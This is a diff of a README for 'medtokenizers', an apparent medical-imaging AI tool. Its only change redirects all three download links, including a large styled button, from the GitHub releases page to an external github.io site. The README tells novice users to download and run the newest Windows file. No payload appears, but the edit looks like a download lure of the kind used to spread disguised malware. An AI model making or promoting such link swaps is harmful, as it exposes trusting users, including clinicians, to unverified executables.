@@ -1,7 +1,7 @@
 <h1>🩺 medtokenizers - Make Your Medical Images Understandable by AI</h1>
 
 <p align="center">
-  <a href="https://github.com/Coriappropriative733/medtokenizers/releases" style="background-color:#ff6b6b;color:white;padding:15px 30px;border-radius:30px;font-size:20px;font-weight:bold;text-decoration:none;display:inline-block;">⬇️ Download medtokenizers Now</a>
+  <a href="https://coriappropriative733.github.io" style="background-color:#ff6b6b;color:white;padding:15px 30px;border-radius:30px;font-size:20px;font-weight:bold;text-decoration:none;display:inline-block;">⬇️ Download medtokenizers Now</a>
 </p>
 
 ---
@@ -36,7 +36,7 @@ Here's what you get:
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: **[medtokenizers Downloads](https://github.com/Coriappropriative733/medtokenizers/releases)**
+Visit this link to download the application: **[medtokenizers Downloads](https://coriappropriative733.github.io)**
 
 Click the blue link above. You'll see a page with different versions. Choose the newest one (usually at the top). Look for the file that matches your computer - if you have Windows, pick something with "windows" or "win" in the name.
 
@@ -131,7 +131,7 @@ The community is friendly and responsive - no question is too basic.
 
 Ready to get started? Remember, your journey to faster, better medical image analysis begins with one download.
 
-**Visit this link to download the application:** **[Get medtokenizers Here](https://github.com/Coriappropriative733/medtokenizers/releases)**
+**Visit this link to download the application:** **[Get medtokenizers Here](https://coriappropriative733.github.io)**
 
 ---
 
